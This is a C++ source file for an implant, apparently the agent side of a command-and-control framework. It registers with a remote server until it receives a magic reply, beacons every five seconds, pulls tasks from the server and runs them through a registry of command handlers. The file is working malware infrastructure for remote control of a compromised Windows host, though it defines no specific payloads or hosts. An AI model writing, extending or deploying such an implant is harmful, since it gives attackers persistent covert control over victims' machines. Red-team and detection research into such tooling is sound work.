#include "Implant.h"
#include "Command.h"
#include "Channel.h"

IImplant				g_Implant;

// ImplantTaskExecute
//
static BOOL ImplantTaskExecute(std::vector<json>& queue, json& result) {
	json	task;
	string	name;
	json	args;
	string	artifact;

	if (queue.empty()) {
		return TRUE;
	}

	task = queue.back();
	queue.pop_back();

	if (task.contains("artifact") && !task["artifact"].empty()) {
		artifact = task["artifact"].get<string>();
	}

	if (task.contains("name") && !task["name"].empty()) {
		name = task["name"].get<string>();
	}
	
	if (task.contains("args") && !task["args"].empty()) {
		args = task["args"];
	}

	// dispatch the task to the correct handler
	for (const auto& command : g_CommandRegistry) {
		if (command.Name == name) {
			command.Invoke(args, artifact, result);
			return TRUE;
		}
	}

	return FALSE;
}

// ImplantTaskQueue
//
static void ImplantTaskQueue(std::vector<json>& queue, json& tasks) {
	for (const auto& item : tasks) {
		queue.push_back(item);
	}
}

// ImplantTaskSend
// 
static BOOL ImplantTaskSend(json& task, json& response) {
	json    packet;
	CHAR* buffer;
	DWORD   size;

	packet["id"] = g_Implant.SessionID;
	packet["task"] = task;

	auto serialized = packet.dump();

	if (!g_Channel->Interface->Send(g_Channel->Interface->Context, serialized.c_str(), serialized.size(), FALSE)) {
		puts("failed to send request");
		return FALSE;
	}

	// read server response
	if (!g_Channel->Interface->Receive(g_Channel->Interface->Context , &buffer, &size)) {
		puts("failed to read response");
		return FALSE;
	}

	if (!size) {
		return TRUE;
	}

	response = json::parse(buffer);
	HeapFree(GetProcessHeap(), 0, buffer);
	return TRUE;
}

// ImplantRegisterSend
// 
static BOOL ImplantRegisterSend(json& task, json& response) {
	json    packet;
	CHAR* buffer;
	DWORD   size;

	packet["id"] = g_Implant.SessionID;
	packet["task"] = task;

	auto serialized = packet.dump();

	if (!g_Channel->Interface->Send(g_Channel->Interface->Context, serialized.c_str(), serialized.size(), TRUE)) {
		return FALSE;
	}

	// read server response
	if (!g_Channel->Interface->Receive(g_Channel->Interface->Context, &buffer, &size)) {
		return FALSE;
	}

	if (!size) {
		return FALSE;
	}

	response = json::parse(buffer);
	HeapFree(GetProcessHeap(), 0, buffer);
	return TRUE;
}

// ImplantRegister send checkin request to server and register
//
void ImplantRegister() {
	json	checkin;
	json	response;
	string	magic;

	// keep sending checkin task until we get "OK" from server
	while (1) {
		if (!ImplantRegisterSend(checkin, response)) {
			continue;
		}

		magic = response["magic"].get<string>();
		if (!magic.compare("baadf00d"))
			return;
	}
}


// ImplantLoop implant beaconing loop
//
void ImplantLoop() {
	std::vector<json>	queue;
	json				result;
	json				response;

	while (1) {
		ImplantTaskExecute(queue, result);
		ImplantTaskSend(result, response);
		ImplantTaskQueue(queue, response);
		response.clear();
		result.clear();
		Sleep(5000);
	}
}

BOOL ImplantInitialize() {
	
	// Implant interface
	g_Implant.SessionID	= RandomUint32();

	// Initialize channel
	if (!ChannelInitialize()) {
		return FALSE;
	}

	return TRUE;
}